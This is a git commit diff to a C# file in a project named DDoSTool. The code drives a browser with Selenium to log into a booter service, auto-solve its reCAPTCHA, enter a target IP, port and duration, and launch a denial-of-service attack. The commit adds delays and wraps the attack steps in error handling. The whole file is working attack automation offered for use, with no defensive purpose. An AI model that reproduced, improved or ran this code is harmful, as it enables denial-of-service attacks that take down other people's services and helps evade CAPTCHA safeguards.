de888c401786a0db963c397f0f42f1b2871cbb62
Chris-Han3en <75200147+Chris-Han3en@users.noreply.github.com>
2021-06-11 17:20:11 +0100

    Update GetSite.cs

--- GetSite.cs
+++ GetSite.cs
@@ -1,4 +1,4 @@
-﻿using System;
+using System;
 using System.Collections.Generic;
 using System.Text;
 using OpenQA.Selenium;
@@ -53,6 +53,7 @@ namespace DDoSTool
             }
             try
             {
+                Thread.Sleep(1000);
                 var Username = wb.FindElement(By.XPath("/html/body/div[2]/main/div/form/div[1]/input"));
                 Username.SendKeys("");
                 var Password = wb.FindElement(By.XPath("//*[@id=\"password\"]"));
@@ -67,29 +68,38 @@ namespace DDoSTool
 
             //clicks the auto complete recapture garbage
             MouseMover.RecaptureComplete();
-            Thread.Sleep(6000);
+            Thread.Sleep(8000);
 
             //stressthem stuff
-            var BooterPannel = wb.FindElement(By.XPath("//*[@id=\"menu\"]/ul/li[2]/a"));
-            BooterPannel.Click();
-            var Method = wb.FindElement(By.XPath("//*[@id=\"layer4\"]/div[2]/select"));
-            Method.Click();
-            var MethodChosen = wb.FindElement(By.XPath("//*[@id=\"layer4\"]/div[2]/select/option[2]"));
-            MethodChosen.Click();
-            var TargetIp = wb.FindElement(By.XPath("//*[@id=\"booter\"]/div[2]/form/div[2]/input"));
-            TargetIp.SendKeys(IP);
-            Console.WriteLine("IP entered");
-            var TargerPort = wb.FindElement(By.XPath("//*[@id=\"booter\"]/div[2]/form/div[2]/div[1]/input[1]"));
-            TargerPort.SendKeys("80");
-            Console.WriteLine("Port entered");
-            var NumberOfSeconds = wb.FindElement(By.XPath("//*[@id=\"booter\"]/div[2]/form/div[2]/div[1]/input[2]"));
-            NumberOfSeconds.SendKeys(Convert.ToString(seconds));
-            var StartAttack = wb.FindElement(By.XPath("//*[@id=\"booter\"]/div[2]/form/div[2]/button"));
-            StartAttack.Click();
-            Console.WriteLine("Time entered");
-            MessageBox.Show($"Attack on {IP} for {seconds} seconds has begun.");
-            Console.WriteLine("\n\nAttack started succefully. Cleaning up injection");
-            wb.Quit();
+            try
+            {
+                var BooterPannel = wb.FindElement(By.XPath("//*[@id=\"menu\"]/ul/li[2]/a"));
+                BooterPannel.Click();
+                var Method = wb.FindElement(By.XPath("//*[@id=\"layer4\"]/div[2]/select"));
+                Method.Click();
+                var MethodChosen = wb.FindElement(By.XPath("//*[@id=\"layer4\"]/div[2]/select/option[2]"));
+                MethodChosen.Click();
+                var TargetIp = wb.FindElement(By.XPath("//*[@id=\"booter\"]/div[2]/form/div[2]/input"));
+                TargetIp.SendKeys(IP);
+                Console.WriteLine("IP entered");
+                var TargerPort = wb.FindElement(By.XPath("//*[@id=\"booter\"]/div[2]/form/div[2]/div[1]/input[1]"));
+                TargerPort.SendKeys("80");
+                Console.WriteLine("Port entered");
+                var NumberOfSeconds = wb.FindElement(By.XPath("//*[@id=\"booter\"]/div[2]/form/div[2]/div[1]/input[2]"));
+                NumberOfSeconds.SendKeys(Convert.ToString(seconds));
+                var StartAttack = wb.FindElement(By.XPath("//*[@id=\"booter\"]/div[2]/form/div[2]/button"));
+                StartAttack.Click();
+                Console.WriteLine("Time entered");
+                MessageBox.Show($"Attack on {IP} for {seconds} seconds has begun.");
+                Console.WriteLine("\n\nAttack started succefully. Cleaning up injection");
+                wb.Quit();
+            }
+            catch (Exception e)
+            {
+                Console.WriteLine(e);
+                MessageBox.Show("A fatal error has occured. This is most likely due to unable to solve the reCAPTCHA. There is a 75% chance the reCAPTCHA is solved and it seems you got unlucky. Please try again later. Too many reCAPTCHA requests will cause a timeout so don't spam the software else a error will occur");
+                wb.Quit();
+            }
         }
     }
 }
